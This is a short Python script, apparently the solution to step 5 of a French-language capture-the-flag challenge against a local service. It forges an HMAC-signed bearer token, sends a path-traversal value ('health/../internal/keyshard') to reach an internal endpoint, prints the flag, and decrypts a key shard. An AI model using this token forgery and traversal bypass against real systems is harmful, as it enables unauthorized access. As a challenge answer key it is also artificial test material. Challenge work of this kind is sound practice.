#!/usr/bin/env python3
"""Solution étape 5.
Usage: step5.py http://127.0.0.1:8080 <SIGNING_KEY> <YYYY-MM-DD>
"""
import base64, hashlib, hmac, sys, time

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def forge_token(key: str, user="player", ttl=600) -> str:
    exp = int(time.time()) + ttl
    sig = hmac.new(key.encode(), f"{user}.{exp}".encode(), hashlib.sha256).hexdigest()
    return f"{user}.{exp}.{sig}"


def decrypt_shard(shard_b64: str, date: str) -> str:
    raw = base64.b64decode(shard_b64)
    key = hashlib.sha256(f"keyshard:{date}".encode()).digest()
    return AESGCM(key).decrypt(raw[:12], raw[12:], b"keyshard-v1").decode()


BYPASS = "health/../internal/keyshard"

if __name__ == "__main__":
    base, key, date = sys.argv[1:4]
    r = requests.get(f"{base}/ping", params={"service": BYPASS},
                     headers={"Authorization": f"Bearer {forge_token(key)}"}, timeout=10)
    r.raise_for_status()
    data = r.json()
    print("flag étape 5 :", data["flag"])
    print("moitié 1     :", decrypt_shard(data["shard"], date))
